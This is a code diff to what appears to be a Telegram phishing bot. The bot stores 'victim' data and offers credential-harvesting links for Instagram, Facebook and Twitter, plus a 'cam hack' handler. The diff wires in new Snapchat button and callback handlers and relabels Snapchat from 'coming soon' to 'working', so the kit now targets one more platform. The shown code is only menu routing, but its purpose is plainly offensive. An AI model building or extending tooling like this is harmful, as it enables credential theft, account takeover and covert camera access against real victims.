@@ -7,7 +7,8 @@ from bot.buttons import (
     handle_cam_hack,
     handle_insta_button, handle_insta_callback,
     handle_face_button, handle_face_callback,
-    handle_twit_button, handle_twit_callback
+    handle_twit_button, handle_twit_callback,
+    handle_snap_button, handle_snap_callback
 )
 from bot.server import app
 from bot.utils.storage import link_cache, victim_data_store
@@ -74,7 +75,7 @@ def show_main_menu(message):
         "📸 Instagram (working)\n"
         "📘 Facebook (working)\n"
         "🐦 Twitter (working)\n"
-        "👻 Snapchat (coming soon)\n"
+        "👻 Snapchat (working)\n"
         "📧 Gmail (coming soon)\n"
         "🎮 Free Fire (coming soon)\n"
         "🔗 All Links (coming soon)",
@@ -101,7 +102,9 @@ def route_buttons(message):
         handle_face_button(bot, message, get_bottom_buttons)
     elif text == "🐦 Twitter":
         handle_twit_button(bot, message, get_bottom_buttons)
-    elif text in ["👻 Snapchat", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
+    elif text == "👻 Snapchat":
+        handle_snap_button(bot, message, get_bottom_buttons)
+    elif text in ["📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
         bot.send_message(user_id, f"⏳ *{text}* coming soon.", reply_markup=get_bottom_buttons(), parse_mode="Markdown")
     else:
         bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())
@@ -125,6 +128,11 @@ def handle_inline(call):
     # Twitter callbacks
     if data in ["twit_copy", "twit_back", "twit_menu"]:
         handle_twit_callback(bot, call)
+        return
+
+    # Snapchat callbacks
+    if data in ["snap_copy", "snap_back", "snap_menu"]:
+        handle_snap_callback(bot, call)
         return
 
     # Generic copy
